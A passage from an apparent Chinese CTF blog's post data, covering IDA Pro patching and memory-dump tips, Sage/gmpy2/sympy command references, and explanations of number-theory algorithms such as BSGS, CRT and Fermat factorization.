&gt;&gt; 32) &amp; 0xffffffff ​ 其他操作导出array为数组右键array变量名 → 转为dword → Export as → C unsigned char array (hex) 手动修复栈指针（Decompilation failure: positive sp value has been found）现象：无法反编译 修复： 对标红位置按 Alt+K 修改栈偏移： 修改后 F5 即可。 手动修改汇编或二进制代码（Patch） 激活功能 Edit▶Patch Program菜单GUI版本的IDA的一项隐藏功能，用户需要编辑idagui.cfg配置文件才能激活该菜单。 改字节（Change word） IDA——Edit——Patch Program——Change word 用于编辑IDA数据库中的字节值。这个对话框显示了从光标所在位置开始的16个字节的值。你可以更改显示的部分或全部字节。同时,Address表示了虚拟地址，File offset表示了文件偏移量。 实际上，Hex View可以直接改字节，右键Edit即可。 改内容（Assemble） IDA——Edit——Patch Program——Assemble 利用“汇编”选项可以输入使用一个内部汇编器汇编的汇编语言语句。然后，IDA会将得到的指令字节写入当前的屏幕位置。 应用修改（Apply patches to input file） IDA——Edit——Patch Program——Apply patches to input file 把改动更新到二进制文件中。 手动定义为函数（恢复伪代码）来到一处看似很像关键代码处的位置： 在这部分代码的头部按 P 键定义为函数，接着尝试查看伪代码，得到的伪代码没有变量识别，非常难看。 于是我们尝试修复堆栈信息，让 IDA 能够识别出来变量。 如图所示，我们可以尝试着在这部分之上使用 Keypatch 手动加入一个 push rbp; mov rbp, rsp 让 IDA 能够识别出堆栈上的变量，紧接着再 F5，就可以看到比较舒服的伪代码了。 Dump代码生成新脚本使用IDA Pro调试程序时偶尔会遇到dump内存的需求，IDA Pro并没有直接提供内存dump的功能，但可以通过其提供的接口用脚本来实现相关功能。 IDC脚本1234auto i,fp;fp = fopen(&quot;d:\\\\dump.dex&quot;,&quot;wb&quot;);for (i = start_address; i &lt;= end_address; i++) fputc(Byte(i),fp); Python脚本12345import idaapidata = idaapi.dbg_read_memory(start_address, data_length)fp = open(&#x27;d:\\\\dump&#x27;, &#x27;wb&#x27;)fp.write(data)fp.close() 异常处理选择本地Windows调试器后点击debugger选项卡中的debugger options，选择左下角的edit exceptions，如触发了除零异常，可以找到整数除零异常（EXCEPTION_INT_DIVIDE_BY_ZERO)，选择pass to application和silent，下断调试即可。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"}],"author":"Lazzaro"},{"title":"crypto常用工具","slug":"crypto-crypto常用工具","date":"2020-05-10T14:41:00.000Z","updated":"2025-03-24T11:56:51.698Z","comments":true,"path":"2020/05/10/crypto-crypto常用工具/","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","excerpt":"","text":"常用工具古典密码 维吉尼亚密码（Vigenere）： https://github.com/atomcated/Vigenere（加密解密程序，包含自动猜测密钥功能） https://www.guballa.de/vigenere-solver whitespace语言： https://ideone.com/ ​ gmpy212345678910from gmpy2 import *mpz(n) #初始化一个大整数mpfr(x) # 初始化一个高精度浮点数xd = invert(e,n) # 求逆元，de = 1 mod nc = powmod(m,e,n) # 幂取模，结果是 c = m^e mod nis_prime(n) #素性检测gcd(a,b) #欧几里得算法，最大公约数gcdext(a,b) #扩展欧几里得算法iroot(x,n) #x开n次根 ​ sympy12345678from sympy import *prime(n) #第n个素数isprime(n) #素性检测primepi(n) #小于n的素数的总数nextprime(n) #下一个素数prevprime(n) #上一个素数nthroot_mod(c,e,p,all_roots=True) #有限域开方 ​ Sage定义123456789R.&lt;X&gt; = PolynomialRing(Zmod(n))#Zmod(n):指定模，定义界限为n的环；Z表示整数；指定模是划定这个环的界限，就是有效的数字只有从0到n，其他的都通过与n取模来保证在0～n这个范围内；Zmod代表这是一个整数域中的n模环#ZZ：整数环；QQ：有理数环；RR：实数环；CC：复数环#R：只是一个指针，指向用polynomialring指定的那个环（可以使用任意字符）#PolynomialRing：这个就是说建立多项式环#.&lt;X&gt;：指定一个变量的意思（可以用任意字符）R.&lt;M&gt; = PolynomialRing(MatrixSpace(Zmod(n),3,3))#定义一个模n的矩阵 ​ 数论123456789101112131415161718192021prime_pi(n) #小于等于n的素数个数divisors(n) #n的因子number_of_divisors(n) #n的因子数factor(n) #n的因式分解euler_phi(n) #n的欧拉函数值two_squares(n) #n的两数平方组合three_squares(n) #n的三数平方组合four_squares(n) #n的四数平方组合x.nth_root(n, truncate_mode=True) #x开n次方（不管是否完全开方，取整）mod(x,p).nth_root(n) #x有限域开n次方# x有限域开n次方，e大def mod_nth_root(x, e, n): r, z = pari(f&quot;r = sqrtn(Mod(&#123;x&#125;, &#123;n&#125;), &#123;e&#125;, &amp;z); [lift(r), lift(z)]&quot;) r, z = int(r), int(z) roots = [r] t = r while (t := (t*z) % n) != r: roots.append(t) return roots ​ 多项式1234567891011121314151617181920212223242526272829303132333435363738394041f.subs(&#123;x:x1&#125;) #把x1值代入xf.univariate_polynomial() #映射为单变量多项式f.univariate_polynomial().roots() #单变量多项式求根f.coefficients() #多项式系数列表f.padded_list(n) #多项式系数转换为长度为n的列表f.list() #多项式系数f.monic() #首一多项式f.sub(x,x-1) #将x-1代入xf.factor() #分解因式#因式分解（单元）x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = (x^3 - 1)^2-(x^2-1)^2f.factor()#因式分解（二元）x, y = PolynomialRing(RationalField(), 2, [&#x27;x&#x27;,&#x27;y&#x27;]).gens()f = (9*y^6 - 9*x^2*y^5 - 18*x^3*y^4 - 9*x^5*y^4 + 9*x^6*y^2 + 9*x^7*y^3 + 18*x^8*y^2 - 9*x^11)f.factor()#GCD（单元）x = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()f = 3*x^3 + xg = 9*x*(x+1)f.gcd(g)#GCD（多元）R.&lt;x,y,z&gt; = PolynomialRing(RationalField(), order=&#x27;lex&#x27;)f = 3*x^2*(x+y)g = 9*x*(y^2 - x^2)f.gcd(g)#多项式/整数转换PR = PolynomialRing(GF(2),&#x27;x&#x27;)R.&lt;x&gt; = GF(2^2049)pc = R.fetch_int(xx) #整数转多项式xx = R(PR(pc)).integer_representation() #多项式转整数#拉格朗日插值PR = PolynomialRing(Zmod(p), &#x27;x&#x27;)f = PR.lagrange_polynomial(points) ​ 矩阵123456789101112131415161718192021A = matrix(ZZ, [[1,1],[0,4]])A.nrows() #行数A.ncols() #列数A.transpose() #转置A.inverse() 或 A^(-1) #逆A.rank() #秩A.det() #行列式A.stack(vector([1,2])) #矩阵后添加一行A.augment(vector([1,2])) #矩阵后添加一列A.insert_row(1, vector([1,2])) #在第一行插入A.change_ring(QQ) #更换环为QQA.solve_left(B) 或 A/B #求解XA=BA.solve_right(B) 或 A\\B #求解AX=BA.left_kernel() #求解XA=0，线性相关的行向量A.right_kernel() #求解AX=0，线性相关的行向量A.LLL() #最短正交基A.multiplicative_order() #乘法阶matrix.zero(2,3) / zero_matrix(2,3) #2*3零矩阵matrix.identity(2) / identity_matrix(2) #2*2单位阵block_matrix(QQ,[[A,zero_matrix(n,1)],[matrix(b),matrix([1e-16])]]) #矩阵拼接 ​ 解方程$\\begin{cases} x+y=10 \\\\ xy=21 \\end{cases} $ 12var(&#x27;x y&#x27;)solve([x+y==10,x*y==21],[x,y]) ​ 解线性方程组$AX=B$ 123456A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) Y = vector([0,-4,-1]) X = A.solve_right(Y)#或A \\ Y#反斜杠 \\ 可以代替 solve_right; 用 A \\ Y 代替 A.solve right(Y). ​ 求逆元$ed=1\\pmod {\\varphi(n)}$ 1d = inverse_mod(e,fn) # sage求逆元 ​ 扩展欧几里得算法12d,u,v=xgcd(20,30)print(&quot;d:&#123;0&#125; u:&#123;1&#125; v:&#123;2&#125;&quot;.format(d,u,v)) #d:10 u:-1 v:1 ​ CRT（中国剩余定理）$\\begin{cases} x\\equiv2\\pmod3 \\\\ x\\equiv3\\pmod5 \\\\ x\\equiv2\\pmod7 \\end{cases} $ 1crt([2,3,2],[3,5,7]) 123456789#仅适用模两两互素def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 ​ 离散对数$a^x \\equiv b \\pmod {n}$ 1234567891011#n为合数（Pohlig-Hellman）x = discrete_log(mod(b,n),mod(a,n)) #n为质数或质数幂（线性筛Index Calculus）R = Integers(99)a = R(4)b = a^9b.log(a)x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) ​ 欧拉函数$\\varphi(x)=x\\prod\\limits_{i=1}^n(1-\\frac{1}{p_i})$ 1print(euler_phi(71)) #70 ​ 整数域椭圆曲线$y^2=x^3+a_4x+a_6$ 输出所有整数点 12345678910111213141516171819202122#素数域F = GF(7)#素数域的阶print(F.order())#椭圆曲线E7(2,3)E = EllipticCurve(F,[0,0,0,2,3])#基点坐标G = E.gens()[0]#阶（不同的离散的点个数）q = E.order()#随机点P = E.random_point()#所有的点allPoints = E.points()#创建点P = E(2,1)#点的xy坐标值P.xy()#倍数点Q = k*PQ.division_points(k) # 结果为P ​ 曲线12345678910111213# 查亏格（Genus）x, y = ZZ[&#x27;x, y&#x27;].gens()eq = x ^ 3 + y ^ 3 + 1 - d * x * yCurve(eq).genus() # Genus=1为椭圆曲线# 映射# solve x^3+y^3+z^3=d*x*y*zR.&lt;xx,yy,zz&gt; = Zmod(p)[]cubic = xx^3 + yy^3 + zz^3 - d * xx * yy * zzEC = EllipticCurve_from_cubic(cubic, morphism=False) #映射的椭圆曲线mf = EllipticCurve_from_cubic(cubic, morphism=True) #映射关系P = PP = mf(P) ​ 解模方程$ax^2+bx+c \\equiv d \\pmod p$ 123456789P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x^2 + b * x + c - dx = f.monic().roots()print(x)x = var(&#x27;x&#x27;)f = a * x^2 + b * x + c - dsol = solve_mod(f, n) # 适用非素数print(sol) ​ 解方程组$\\begin{cases} N=pq \\\\ \\varphi = (p-1)(q-1) \\end{cases} $ 12345678910111213141516P.&lt;p, q&gt; = PolynomialRing(ZZ)def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))N = phi = f1 = (N + 1) - phi - p - qf2 = N - p*qp, q = solve(f1, f2)(p, q) 参考： https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ ​ 结式12345678910111213from sage.matrix.matrix2 import Matrixdef resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))n = P.&lt;k,t2,t3,d&gt; = PolynomialRing(Integers(n))f1 = s1*k - h - r*df2 = s2*(k+t2) - h - r*df3 = s3*(k+t3) - h - r*dh1 = resultant(f1, f2, d)h2 = resultant(f1, f3, d)g1 = resultant(h1, h2, k)roots = g1.univariate_polynomial().roots() ​ WolframAlphahttps://www.wolframalpha.com/","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"}],"author":"Lazzaro"},{"title":"crypto常用算法","slug":"crypto-crypto常用算法","date":"2020-05-10T09:54:00.000Z","updated":"2024-06-30T01:53:52.713Z","comments":true,"path":"2020/05/10/crypto-crypto常用算法/","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/","excerpt":"","text":"欧几里得算法（辗转相除法）在数学中，辗转相除法，又称欧几里得算法（英语：Euclidean algorithm），是求最大公约数的算法。 两个整数的最大公约数是能够同时整除它们的最大的正整数。辗转相除法基于如下原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。在这个过程中，较大的数缩小了，所以继续进行同样的计算可以不断缩小这两个数直至其中一个变成零。这时，所剩下的还没有变成零的数就是两数的最大公约数。由辗转相除法也可以推出，两数的最大公约数可以用两数的整数倍相加来表示，如 $21 = 5 × 105 + (−2) × 252$。这个重要的结论叫做裴蜀定理。 在现代密码学方面，它是RSA算法的重要部分。它还被用来解丢番图方程，比如寻找满足中国剩余定理的数，或者求有限域中元素的逆。辗转相除法还可以用来构造连分数，在施图姆定理和一些整数分解算法中也有应用。辗转相除法是现代数论中的基本工具。 12345def gcd(a, b): if b == 0: return a else: return gcd(b, a % b) ​ 扩展欧几里得算法扩展欧几里得算法（英语：Extended Euclidean algorithm）是欧几里得算法（又叫辗转相除法）的扩展。已知整数 $a,b$，扩展欧几里得算法可以在求得$a,b$的最大公约数的同时，能找到整数 $x,y$（其中一个很可能是负数），使它们满足裴蜀定理 $ax + by = \\gcd(a, b)$如果 $a$ 是负数，可以把问题转化成 $|a|(-x)+by=\\gcd(|a|,b))$（$|a|$ 为 $a$ 的绝对值），然后令 $x’=(-x)$。通常谈到最大公约数时，我们都会提到一个非常基本的事实（由裴蜀定理给出）：给定二个整数 $a,b$，必存在整数 $x,y$ 使得 $ax + by = \\gcd(a, b)$。 众所周知，已知两个数 $a$ 和 $b$，对它们进行辗转相除（欧几里得算法），可得它们的最大公约数。不过，在欧几里得算法中，我们仅仅利用了每步带余除法所得的余数。扩展欧几里得算法还利用了带余除法所得的商，在辗转相除的同时也能得到裴蜀等式中的 $x,y$ 两个系数。以扩展欧几里得算法求得的系数是满足裴蜀等式的最简系数。 另外，扩展欧几里得算法是一种自验证算法，最后一步得到的 $s_{i+1}$ 和 $t_{i+1}$ 乘以 $\\gcd(a,b)$ 后恰为 $a$ 和 $b$，可以用来验证计算结果是否正确。 扩展欧几里得算法可以用来计算模反元素（也叫模逆元），求出模反元素是RSA加密算法中获得所需公钥、私钥的必要步骤。 1234567def ext_euclid(a, b): if b == 0: return 1, 0, a else: x, y, q = ext_euclid(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q ​ 大步小步算法（BSGS算法）在群论中，大步小步算法（英语：baby-step giant-step）是丹尼尔·尚克斯发明的一种中途相遇算法，用于计算离散对数或者有限阿贝尔群的阶。其中离散对数问题在公钥加密领域有着非常重要的地位。 许多常用的加密系统都基于离散对数极难计算这一假设——计算越困难，这些系统提供的数据传输就越安全。增加离散对数计算难度的一种方法，是把密码系统建立在更大的群上。 这是一种空间换时间的算法，实质上是求解离散对数的朴素算法（枚举并试乘）的一个相当简单的改进。 大步小步算法常用于求解用于解决解高次同余方程的问题，问题形式如：有同余方程 $a^x \\equiv b \\pmod p$，$p$ 为质数，求最小非负整数解 $x$ 使得原方程成立。这类问题也称为离散对数问题。该算法的复杂度可以达到 $O(\\sqrt{p}\\log{n})$ 甚至更低。 原理 根据欧拉定理，我们知道模的剩余类有产生循环的情况，即 $a^0, a^1, \\ldots, a^{n-1}$ 模 $n$（质数）意义下的剩余类与 $a^n, a^{n+1}, \\ldots, a^{2n-1}$ 的剩余类相同，因此我们要的答案一定在 $[0, n-1]$ 内。我们考虑先求出一部分 $a$ 的幂次模 $p$ 意义下的值，将它们存起来，然后使得剩下没有求值的部分能够想个办法利用已求值直接查出来。我们想起了根号，不如直接令求值的长度为 $m=\\lceil \\sqrt{p} \\rceil$。下面要考虑的是没有求值部分怎么来求，比如 $a^m, \\ldots, a^{2m-1}$ 这一段，如果有解，一定是 $a^i \\cdot a^m \\equiv b \\pmod{p}$ 的情况，我们把那个 $a^m$ 移到右边来，就变成了 $a^i \\equiv b’ \\pmod{p}$ 且 $b’ = ba^{-m}$。既然这样，我们为什么不考虑直接查这个 $b’$ 有没有对应的i的答案。这样，没有求值的部分的每一段就可以只进行一次查询来判断该段内是否有解。这个保存，我们可以用一个map&lt;int,int&gt;来存，$x[i]$ 为余数为 $i$ 的 $a^x$ 中最小的 $x$ 值，则插入查询都为 $O(\\log n)$，总复杂度达到 $O(\\sqrt{n} \\log n)$。当然还可以用HashMap存，复杂度会更优一些。 123456789101112131415161718192021222324252627282930313233343536373839//C++#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;map&gt; using namespace std;typedef long long LL; LL quick_mod(LL a, LL b, LL c)//费马小定理+快速幂求逆元 &#123; LL ans = 1; while (b) &#123; if (b % 2 == 1) ans = (ans*a) % c; b /= 2; a = (a*a) % c; &#125; return ans;&#125; int log_mod(int a, int b, int n) &#123; int m, v, e = 1, i; m = (int)sqrt(n + 0.5); v = quick_mod(quick_mod(a, m, n),n-2, n); map&lt;int, int&gt; x; x[1] = 0; for (int i = 1; i &lt; m; i++) &#123; e = e*a%n; if (!x.count(e)) x[e] = i; &#125; for (i = 0; i &lt; m; i++) &#123; if (x.count(b)) return i*m + x[b]; b = b*v%n; &#125; return -1;&#125; 123456789101112#pythondef BSGS(g, y, p): m = int(sqrt(p)) if not is_square(p): m += 1 S = &#123;pow(g, j, p): j for j in range(m)&#125; gs = pow(g, inverse(m, p), p) for i in range(m): if y in S: return i * m + S[y] y = y * gs % p return None ​ 扩展大步小步算法（扩展BSGS算法）原理 $p$ 非质数怎么办呢？并不是说 $p-1$ 以内没有答案，而是 $p$ 可能会很大。想个办法来缩小 $p$ 的范围。我们想起了一些同余性质，比如 $a \\equiv b \\pmod{m} \\Leftrightarrow \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{m}{d}}$，其中 $d$ 为 $a,b,m$ 的正公因数。我们想办法如此提公因数。从方程左边拆一个 $a$ 出来，提公因数，提完就变成这样一个式子 $a^{x-1} \\cdot \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{p}{d}}$。直到某个时候 $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) = 1$。如果在提公因数的过程中，遇到 $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) \\neq 1$ 且 $d$ 不能整除 $b$ 的情况，说明式子无解。 因为 $a^x, p$ 中的一个共同的因数$b$中没有，显然不存在这样的 $b$。结束以后，我们得到的会是一个这样的式子$a^{x-k} \\cdot \\frac{a^k}{\\prod_i d_i} \\equiv \\frac{b}{\\prod_i d_i} \\pmod{\\frac{p}{\\prod_i d_i}}$把分母搞掉$a^x \\equiv b \\pmod{\\frac{p}{\\prod_i d_i}}$这个直接扔给普通BSGS做就好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll; inline int gcd(int a,int b)&#123; if(!b) return a; else&#123; while(int i=a%b)&#123; a=b; b=i; &#125; return b; &#125;&#125; inline int qpow(ll a,int n,int m) &#123; //这个快速幂保证p不是1，少模一次是一次 ll s=1; while(n) &#123; if(n&amp;1) s=s*a%m; a=a*a%m; n&gt;&gt;=1; &#125; return s;&#125; unordered_map&lt;int,int&gt; M;//要求a,n互质 a^x=b mod n .k,t是留给exbsgs调用的int bsgs(int a,int b,int n,int k=1,int t=0) &#123; if(b==1) return 0; M.clear(); int m=ceil(sqrt(n)); ll s=b;//BS for(int i=0; i&lt;m; i++,s=s*a%n) M[s]=i; s=k;//GS k=qpow(a,m,n); for(ll i=1; i&lt;=m; i++) &#123; s=s*k%n; if(M.count(s)) return i*m-M[s]+t; //这样就保证找到的是最小解了 &#125; return -1;&#125; //a^x=b mod nint exbsgs(int a,int b,int n) &#123; if(b==1) &#123; return 0; &#125; int d=gcd(a,n),k=1,t=0; while(d^1) &#123; if(b%d) &#123; return -1; &#125; ++t; b/=d; n/=d; k=(ll)k*(a/d)%n; if(b==k) &#123; return t; &#125; d=gcd(a,n); &#125; return bsgs(a,b,n,k,t);&#125; int main() &#123; int a,b,n; while(1) &#123; scanf(&quot;%d%d%d&quot;,&amp;a,&amp;n,&amp;b); if(!a&amp;&amp;!n&amp;&amp;!b) break; a%=n; b%=n; int ans=exbsgs(a,b,n); if(ans==-1) puts(&quot;No Solution&quot;); else printf(&quot;%d\\n&quot;,ans); &#125; return 0;&#125; ​ 威尔逊定理在初等数论中，威尔逊定理给出了判定一个自然数是否为质数的充分必要条件。即：当且仅当p为质数时： $ (p-1)! \\equiv -1 \\pmod p$但是由于阶乘是呈爆炸增长的，其结论对于实际操作意义不大。 推论 $ (p-2)! \\equiv 1\\pmod p$ ​ 欧拉定理在数论中，欧拉定理（也称费马-欧拉定理或欧拉$\\varphi$函数定理）是一个关于同余的性质。欧拉定理表明，若 $n,a$ 为正整数，且 $n,a$ 互素（即 $\\gcd(a,n)=1$），则 $a^{\\varphi (n)}\\equiv 1{\\pmod n}$即 $a^{\\varphi (n)}$ 与 $1$ 在模 $n$ 下同余；$\\varphi (n)$ 为欧拉函数。欧拉定理得名于瑞士数学家莱昂哈德·欧拉。 欧拉定理实际上是费马小定理的推广。 ​ 费马小定理费马小定理是数论中的一个定理。 假如 $a$ 是一个整数，$p$ 是一个质数，那么 $a^p-a$ 是 $p$ 的倍数，可以表示为： $a^p \\equiv a \\pmod p$如果 $a$ 不是 $p$ 的倍数，这个定理也可以写成： $a^{p-1} \\equiv 1 \\pmod p$这个书写方式更加常用。 ​ 费马商在费马小定理中，$\\frac{a^{p-1}-1}{p}$ 显然是一个整数。 这个整数被称作 $p$ 的以 $a$ 为基的费马商(Fermat Quotient)，记作 $q_p(a)$。 性质 （其中 $a,b$ 和 $p$ 互素） $q_p(ab) \\equiv q_p(a)+q_p(b) \\pmod p$ $q_p(a^r) \\equiv rq_p(a) \\pmod p$ $q_p(p \\mp 1) \\equiv \\pm 1 \\pmod p$ $q_p(p \\mp a) \\equiv q_p(a) \\pm \\frac{1}{a} \\pmod p$ $-2q_p(2) \\equiv -\\sum\\limits_{k = 1}^{p-1} \\frac{(-1)^{k-1}}{k} \\pmod p = 1+\\frac{1}{2}+\\cdots+\\frac{1}{\\frac{p-1}{2}} \\pmod p = \\sum\\limits_{k = 1}^{\\frac{p-1}{2}} \\frac{1}{k} \\pmod p$ ​ 二次剩余二次剩余(Quadratic Residue)常被称为模意义开根，是求满足 $x^2 \\equiv a \\pmod p$ 的值。 并不是对每个 $a$ 而言上面的方程都有解。如果上面的方程有非零解，我们称 $a$ 是模 $p$ 的二次剩余。如果方程无解，则称 $a$ 是模 $p$ 的二次非剩余。 欧拉准则 $\\left(\\cfrac ap\\right) \\equiv a^{\\frac {p-1}2} \\pmod p$ 勒让德符号 (Legendre Symbol)$L(a,p)=\\left(\\frac ap\\right)=\\left\\{\\begin{array}{cl}1,&amp;\\mbox{若 }a\\mbox{ 是 } p \\mbox{ 的二次剩余}\\newline 0,&amp;\\mbox{若 }a \\bmod p = 0\\newline -1,&amp;\\mbox{若 }a\\mbox{ 是 } p \\mbox{ 的二次非剩余}\\end{array}\\right.$ 性质 $\\left(\\cfrac ap\\right) = \\left(\\cfrac {a \\pm p}p\\right) = \\left(\\cfrac {a \\bmod p}p\\right)$ $\\left(\\cfrac {ab}p\\right) = \\left(\\cfrac ap\\right)\\left(\\cfrac bp\\right)$ $\\left(\\frac {-1}p\\right)=\\left\\{\\begin{array}{cl}1,&amp; p \\equiv 1 \\pmod 4 \\newline -1,&amp; p \\equiv 3 \\pmod 4 \\end{array}\\right.$ $\\left(\\frac 2p\\right)=\\left\\{\\begin{array}{cl}1,&amp; p \\equiv \\pm 1 \\pmod 8 \\newline -1,&amp; p \\equiv \\pm 3 \\pmod 8 \\end{array}\\right.$ $\\left(\\cfrac pq\\right)\\left(\\cfrac qp\\right) = (-1)^{\\frac{p-1}2{\\frac{q-1}2}}$ $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax+b}p\\right)=0,p\\nmid a$ $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax^2+bx+c}p\\right) = \\left\\{\\begin{array}{cl}-\\left(\\cfrac ap\\right),&amp; p \\nmid b^2-4ac \\newline (p-1)\\left(\\cfrac ap\\right),&amp; p \\mid b^2-4ac \\end{array}\\right.$ 参考：Some sums of Legendre’s symbols 雅可比符号 (Jacobi Symbol)$J(a,p) = \\left(\\cfrac an\\right)= \\prod\\limits_{i=1}^{m} \\left(\\cfrac a{p_i}\\right)^{t_i},n = \\prod\\limits_{i=1}^{m} p_i^{t_i}$ 性质 $\\left(\\cfrac an\\right) = \\left(\\cfrac {a \\pm n}n\\right) = \\left(\\cfrac {a \\bmod n}n\\right)$ $\\left(\\cfrac {ab}n\\right) = \\left(\\cfrac an\\right)\\left(\\cfrac bn\\right)$ $\\left(\\cfrac {-1}n\\right)= (-1)^{\\frac{n-1}2}$ $\\left(\\cfrac 2n\\right)= (-1)^{\\frac{n^2-1}8}$ ​ 中国剩余定理（孙子定理 / CRT）定义 用现代数学的语言来说明的话，中国剩余定理给出了以下的一元线性同余方程组： $(S):\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ 有解的判定条件，并用构造法给出了在有解情况下解的具体形式。 说明 假设整数 $m_1,m_2,…,m_n$ 其中任两数互质，则对任意的整数：$a_1,a_2,…,a_n$，方程组 $(S)$ 有解，并且通解可以用如下方式构造得到： 设 $M=m_1×m_2×\\dots×m_n=\\prod\\limits_{i=1}^{n} m_i$ 是整数 $m_1,m_2,…,m_n$ 的乘积，并设 $M_i=\\cfrac{M}{m_i},\\forall i \\in \\{1,2,…,n\\}$，即 $M_i$ 是除了 $m_i$ 以为的 $n-1$ 个整数的乘积。 设 $t_i=M_i^{-1}$ 为 $M_i$ 模 $m_i$ 的数论倒数：$t_iM_i \\equiv 1 \\pmod {m_i},\\forall i \\in \\{1,2,…,n\\}$。 方程组 $(S)$ 的通解形式为： $x=a_1t_1M_1+a_2t_2M_2+\\dots+a_nt_nM_n+kM=kM+\\sum\\limits_{i=1}^{n}a_it_iM_i,\\quad k\\in \\mathbb{Z}$ 在模 $M$ 的意义下，方程组 $(S)$ 只有一个解：$x=\\sum\\limits_{i=1}^{n}a_it_iM_i$。 模不两两互质的同余式组可化为模两两互质的同余式组，再用孙子定理直接求解。 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 ​ 扩展中国剩余定理（扩展CRT / ExCRT）中国剩余定理是用来解同余方程组的，它要求 $m_1,m_2,…,m_n$其中两两互质。 模不两两互质的同余式组可化为模两两互质的同余式组，再用中国剩余定理直接求解。 形式 给定 $n$ 组非负整数 $m_i, a_i$ ，求解关于 $x$ 的方程组的最小非负整数解。 $\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ 解法 扩展中国剩余定理的方法和中国剩余定理关系不大，我们贪心处理前 $i-1$ 项，然后合并当前方程。 将每个方程拆成若干个方程 $x=a_i \\pmod {p_{i,j}^{k_{i,j}}}$，其中 $m_i=\\prod p_{i,j}^{k_{i,j}}$ 为$m_i$ 的分解式。 对每个质数 $p$，合并对应的所有方程，从而转化为模数两两互质的情形。若合并过程中出现矛盾，则原方程组无解。 12345678910111213#互质与不互质两种情况下都能工作良好的中国剩余定理（解同余方程组）def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d return (cura % curm, curm) #(解,最小公倍数) 变种1：Noisy CRT$L_i=\\frac{\\prod p_i}{p_i} \\cdot \\Big((\\frac{\\prod p_i}{p_i})^{-1} \\bmod p_i \\Big)$ $N \\equiv \\sum\\limits_{i=1}^{n}\\sum\\limits_{j=1}^{m} \\delta_{i,j}r_{i,j}L_i \\pmod {\\prod p_i}, \\delta = \\{0,1\\}$ 构造格： $M =\\begin{bmatrix}P &amp; 0 &amp; \\cdots &amp; \\cdots &amp; 0 &amp; \\newliner_{1,1}L_1 &amp; B &amp; 0 &amp; \\cdots &amp; 0 &amp; \\newliner_{1,2}L_1 &amp; 0 &amp; B &amp; \\ddots &amp; \\vdots &amp; \\newline\\vdots &amp; \\vdots &amp; \\ddots &amp; \\ddots &amp; 0 &amp; \\newliner_{n,m}L_n &amp; 0 &amp; \\cdots &amp; 0 &amp; B &amp; \\newline\\end{bmatrix}$ $B$ 主要是为了优化格，只需随意选取和 $N$ 的bit相同的数 $2^k$ 即可，目标向量为 $(N,\\delta_{1,1}B,\\delta_{1,2}B,\\cdots,\\delta_{n,m}B)$。 参考： Noisy Polynomial Interpolation and Noisy Chinese Remaindering DeadSec CTF 2023 - Loud系列 Neepu CTF 2023 - Loud &amp; Loud2 ​ 费马因式分解引理：如果 $n$ 是一个正奇数,那么 $n$ 分解为两个正整数的积和表示成两个平方数是一一对应的。 即：$n=ab=x^2-y^2=(x+y)(x-y)=\\left(\\cfrac{a+b}{2}\\right)^2-\\left(\\cfrac{a-b}{2}\\right)^2$。 因为 $n$ 为奇数，$a,b$ 必也为奇数，所以 $(a+b)$ 和 $(a-b)$ 必为偶数，故能被 $2$ 整除。 算法 从 $x=\\lceil\\sqrt{n}\\rceil+k,k \\in \\mathbb{Z}$ 开始，当 